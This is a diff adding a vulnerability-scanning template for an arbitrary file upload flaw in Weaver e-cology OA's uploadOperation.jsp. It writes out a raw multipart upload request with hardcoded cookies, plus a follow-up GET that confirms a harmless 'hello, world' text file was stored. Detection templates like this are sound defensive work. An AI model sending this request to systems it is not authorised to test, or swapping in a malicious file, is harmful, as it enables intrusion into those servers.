@@ -1,0 +1,44 @@
+id: weaver-ecology-upload-operation
+info:
+  name: Weaver e-cology OA File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver e-cology OA uploadOperation.jsp page allows arbitrary file upload, enabling an attacker to upload malicious files and potentially execute remote code.
+  tags: fileupload
+http:
+  - raw:
+      - |
+        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryULRwuFJuwpBsC7H4
+        Cookie: ecology_JSessionid=aaa8XwWbCjviFcvq3-_ex; JSESSIONID=aaa8XwWbCjviFcvq3-_ex; ecology_JSessionId=aaa8XwWbCjviFcvq3-_ex; __randcode__=c468b69e-fb20-493f-9295-fc64f8974908; loginidweaver=1; languageidweaver=7; loginuuids=1
+
+        ------WebKitFormBoundaryULRwuFJuwpBsC7H4
+        Content-Disposition: form-data; name="upfile"; filename="{{rand_base(6)}}.txt"
+        Content-Type: application/octet-stream
+
+        hello, world
+        ------WebKitFormBoundaryULRwuFJuwpBsC7H4--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "hello, world"
+  - raw:
+      - |
+        GET /page/exportImport/fileTransfer/{{rand_base(6)}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "hello, world"
